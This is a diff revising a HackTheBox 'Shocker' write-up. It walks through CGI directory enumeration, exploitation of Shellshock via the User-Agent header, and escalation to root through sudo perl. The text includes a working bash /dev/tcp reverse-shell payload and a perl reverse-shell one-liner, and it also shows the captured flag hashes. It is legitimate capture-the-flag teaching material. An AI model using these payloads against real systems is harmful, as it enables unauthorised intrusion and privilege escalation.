@@ -53,13 +53,11 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 18.89 seconds
 ```
 
-Let’s check out the website…
+Here is the website.
 
 ![website](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Shocker/website.png?raw=true)
 
-It seems like there’s nothing much on the website and the source code…
-
-Let’s run a `dirsearch` scan then!
+`dirsearch` revealed some hidden directories.
 
 ```bash
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/Shocker]
@@ -73,11 +71,11 @@ Let’s run a `dirsearch` scan then!
 Task Completed
 ```
 
-It seems like there is nothing much too… The only thing that seems interesting is the `/cgi-bin/` directory.
+Let’s check out the `/cgi-bin/` directory.
 
 >   A CGI-bin is a folder used to house scripts that will interact with a Web browser to provide functionality for a Web page or website
 
-Let’s run `dirsearch` again on the `/cgi-bin/` directory with some common extensions like `sh, cgi, bash`
+Let’s run `dirsearch` again on the `/cgi-bin/` directory with some common extensions like `sh, cgi, bash`.
 
 ```bash
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/Shocker]
@@ -88,7 +86,7 @@ Let’s run `dirsearch` again on the `/cgi-bin/` directory with some common exte
 ...
 ```
 
-OwO! There is a `user.sh` file?
+There is a very interesting `user.sh` file.
 
 ```bash
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/Shocker]
@@ -100,31 +98,19 @@ Just an uptime test script
  07:31:03 up 30 min,  0 users,  load average: 0.00, 0.02, 0.00
 ```
 
-It seems like a bash script running?
-
 # Exploitation
 
-I did some Googling on `cgi bin exploits` and an interesting vulnerability `ShellShock` showed up.
+Googling for `cgi bin exploits` resulted in a vulnerability called `ShellShock`.
 
 According to this [GitHub](https://github.com/opsxcq/exploit-CVE-2014-6271) repository, we can check for the exploit by adjusting the `User Agent` to have some bash command.
 
-Let’s open Burp Suite and try it out in the Burp Repeater!
-
 ![burp](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Shocker/burp.png?raw=true)
 
-Oh! It seems like it worked :D
-
-Can we possibly send a reverse shell bash script to gain access to `shelly`?
+Let’s send a reverse shell bash script to gain access to `shelly`.
 
 ```bash
-Before: 
-User Agent: () { :; }; echo; /bin/bash -c "whoami"
-
-After:
 User Agent: () { :; }; echo; /bin/bash -c "exec bash -i &>/dev/tcp/<ip>/<port> <&1"
 ```
-
-Now, we open a netcat listener and execute the script…
 
 ```bash
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/Shocker]
@@ -134,8 +120,6 @@ connect to [10.10.14.25] from (UNKNOWN) [10.10.10.56] 44040
 bash: no job control in this shell
 
 shelly@Shocker:/usr/lib/cgi-bin$ cd /home/shelly
-shelly@Shocker:/home/shelly$ ls
-user.txt
 shelly@Shocker:/home/shelly$ cat user.txt
 2ec24e11320026d1e70ff3e16695b233
 ```
@@ -155,9 +139,7 @@ User shelly may run the following commands on Shocker:
     (root) NOPASSWD: /usr/bin/perl
 ```
 
-It seems like she can run `perl` :)
-
-Let’s craft a reverse shell with `perl` and start another listener OwO
+It seems like she can run `perl`. We can run a reverse shell command with `perl`.
 
 ```perl
 sudo /usr/bin/perl -e 'use Socket;$i="<ip>";$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
@@ -172,8 +154,6 @@ connect to [10.10.14.25] from (UNKNOWN) [10.10.10.56] 41834
 # whoami
 root
 # cd /root
-# ls
-root.txt
 # cat root.txt
 52c2715605d70c7619030560dc1ca467
 ```
